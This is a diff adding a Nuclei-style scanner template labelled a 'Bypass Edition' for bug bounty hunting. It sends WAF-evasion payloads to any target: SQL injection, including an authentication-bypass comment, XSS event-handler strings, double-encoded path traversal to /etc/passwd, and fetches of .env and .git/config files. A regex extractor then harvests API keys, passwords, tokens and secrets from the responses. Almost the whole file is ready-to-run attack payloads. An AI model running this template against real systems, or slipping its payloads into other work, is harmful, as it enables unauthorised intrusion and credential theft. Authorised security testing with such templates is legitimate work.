@@ -1,0 +1,66 @@
+id: ultimate-bypass-pwn
+
+info:
+  name: Professional Bug Bounty Hunter (Bypass Edition)
+  author: thenawabx
+  severity: critical
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+      # --- Advanced SQLi WAF Bypass (Hex & Auth Bypass) ---
+      - "{{BaseURL}}?id=1%27%20UNION%20SELECT%20null,CONCAT(0x726f6f74),null--" # Hex for 'root'
+      - "{{BaseURL}}?user=admin%27%20%23"
+      - "{{BaseURL}}?id=1%22%20/*!50000AND*/%201=1--"
+      
+      # --- Advanced XSS WAF Bypass (Event Handlers) ---
+      - "{{BaseURL}}?q=<svg/onload=confirm(document.domain)>"
+      - "{{BaseURL}}?name=<img/src/onerror=prompt(8)>"
+      - "{{BaseURL}}?id=<details/open/ontoggle=confirm(1)>"
+      - "{{BaseURL}}?x=<marquee/onstart=confirm(1)>"
+      
+      # --- LFI (Double Encoding Bypass) ---
+      - "{{BaseURL}}?file=....//....//....//etc/passwd"
+      - "{{BaseURL}}?path=..%252f..%252f..%252fetc/passwd"
+      
+      # --- Sensitive Files ---
+      - "{{BaseURL}}/.env"
+      - "{{BaseURL}}/.git/config"
+
+    extractors:
+      # Valid Key/Token Extraction (6+ chars)
+      - type: regex
+        name: key
+        regex:
+          - '(?i)(api_key|password|auth_token|secret)[\s]*[:=][\s]*["'']([a-zA-Z0-9@#$%^&*]{6,64})["'']'
+        part: body
+
+    matchers-condition: or
+    matchers:
+      # SQLi Detection (Looking for 'root' or Database Errors)
+      - type: regex
+        name: SQLi-Found
+        regex:
+          - "root:x:0:0"
+          - "PostgreSQL.*ERROR"
+          - "Warning.*mysql_fetch"
+          - "SQL syntax.*MySQL"
+          - "admin'--"
+
+      # XSS Detection (Reflection check)
+      - type: word
+        name: XSS-Found
+        words:
+          - "<svg/onload=confirm(document.domain)>"
+          - "<img/src/onerror=prompt(8)>"
+          - "<details/open/ontoggle=confirm(1)>"
+        part: body
+
+      # LFI Detection
+      - type: regex
+        name: LFI-Found
+        regex:
+          - "root:.*:0:0:"
+        part: body
